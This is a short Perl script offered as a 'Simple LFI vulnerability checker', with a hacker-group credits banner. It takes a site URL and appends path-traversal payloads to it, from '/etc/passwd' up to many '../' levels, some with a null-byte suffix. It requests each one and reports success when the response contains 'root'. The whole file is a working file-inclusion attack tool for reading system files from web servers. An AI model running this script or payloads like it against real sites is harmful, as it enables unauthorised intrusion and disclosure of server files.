#!/usr/bin/perl

use LWP::UserAgent;
use HTTP::Request;


print q(

   +++++++++++++++++++++++++++++++++++++++++++++++++
   -                  -                            -
   -                  -                            -
   -   Simple LFI vulnerability checker            -
   -              by D4T4X                         -
   -                  -                            -
   -      Visit ljuska.org | madspot.org       	   -
   -         Thanks stefo for help                 -
   +++++++++++++++++++++++++++++++++++++++++++++++++

);
print "Your site:\n";
$url= <STDIN>;
chomp($url);

@adressess = ('/etc/passwd%00','../etc/passwd%00','../../etc/passwd%00','../../../etc/passwd%00','../../../../etc/passwd%00','../../../../../etc/passwd%00','../../../../../../etc/passwd%00','../../../../../../../etc/passwd%00','../../../../../../../../etc/passwd%00','../../../../../../../../../etc/passwd%00','../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../../../etc/passwd%00','/etc/passwd','../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd','../../../../../../../../../etc/passwd','../../../../../../../../../../etc/passwd','../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../etc/passwd','../../../../../../../../../../../../../etc/passwd');

foreach $try(@adressess) {
my $site = $url.$try;
my $w = HTTP::Request->new(GET=>$site);
my $ua = LWP::UserAgent->new();
my $an = $ua->request($w);

if($an->content =~ root) {
print "w00t! w00t!-Founded !\n";
print "Adress: \n$site\n";
}


print $try ."\n\n\n";



}